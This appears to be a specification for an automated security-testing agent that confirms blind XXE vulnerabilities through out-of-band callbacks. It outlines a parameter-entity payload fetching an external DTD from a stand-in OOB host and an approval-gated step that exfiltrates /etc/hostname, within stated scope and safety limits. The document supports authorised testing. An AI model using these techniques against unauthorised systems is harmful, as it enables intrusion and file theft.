# Blind XXE Agent

> Variant of the XXE family (sibling: `xxe-inband`). Consumes `xxe_context.json` sinks with
> `error_reflects: false` / `variant_hint: blind`.
> ACTIVE + findings-producing → imports `_contract/roe-gate.md` + **approval**. Carries `review.md` + `verify.md`.
> Confirmation is OUT-OF-BAND via an external DTD + parameter entities.

## Interview
- **STEPS:** ingest blind sinks → set up OOB + host an external DTD → send a parameter-entity payload → confirm resolution via callback → (approval) exfil a benign file over OOB → rate → emit → review → verify.
- **TOOLS:** interceptor, OOB host serving a DTD (`interactsh`/own server), `xxe-context/refs/xxe_payloads.md`.
- **GOAL:** Confirm blind XXE — the parser fetches an external DTD / entity from the attacker — via an attributable OOB callback, optionally exfiltrating a benign file. Done = checklist `- [x]`, review passes, findings accepted.
- **OUTPUT:** `oob_config.json`, `xxe_tests.jsonl`, `callbacks.jsonl`, `findings.json`, `poc/`, `report.md`, `curl_commands.sh`, `logs/`.
- **DATA / RAG:** inputs = `xxe_context.json` (blind sinks) + `scope.yaml` (`oob.collaborator` required). `refs/` = `xxe-context/refs/`. Chains FROM `xxe-context`; chains TO `reporting`.
- **DECOMPOSITION:** this IS the blind variant.

## Goal
Prove blind XXE via OOB external-DTD resolution (+ optional benign file exfil). Emit `findings.json`
(`_contract/finding.schema.json`). DONE = `checklist.md` `- [x]` · `review.md` PASS · callback-backed, accepted.

## Steps  (action · tool · output)
1. Ingest blind sinks · `jq xxe_context.json` · (into tests)
2. Stand up OOB + host an external DTD (token scheme) · OOB host · `oob_config.json`
3. Send parameter-entity payload (`%ext SYSTEM http://TOKEN.oob/x.dtd`) · interceptor · `xxe_tests.jsonl`
4. Confirm resolution via callback; (approval) exfil a benign file (`/etc/hostname`) over OOB · OOB poller · `callbacks.jsonl`
5. Capture PoC (payload + callback carrying benign content) · synth · `poc/<id>/`
6. Rate (CVSS) + write finding · synth · `findings.json`
7. Emit report + curl · synth · `report.md`, `curl_commands.sh`
8. /REVIEW · `review.md` · 9. /VERIFY · `verify.md`

## Tools
- interceptor, OOB host serving a DTD, `xxe-context/refs/xxe_payloads.md`
- **Fetch ladder:** `_contract/anti-automation-ladder.md`

## Inputs
- `xxe_context.json` (blind sinks), `scope.yaml` (`oob.collaborator` required)

## Outputs
`oob_config.json` · `xxe_tests.jsonl` · `callbacks.jsonl` · `findings.json` · `poc/` · `report.md` · `curl_commands.sh` · `logs/`

## Phases
- **Phase 1 (generic):** OOB + external-DTD setup + parameter-entity resolution confirmation.
- **Phase 2 (target-specific):** benign file exfil over OOB + rating (approval-gated).

## Safety
Benign OOB confirmation; exfil only a non-sensitive file (`/etc/hostname`) to prove the issue; **no DoS**;
approval-gated for file exfil; async callbacks — keep listener up; scope-gate; audit-log the token map.
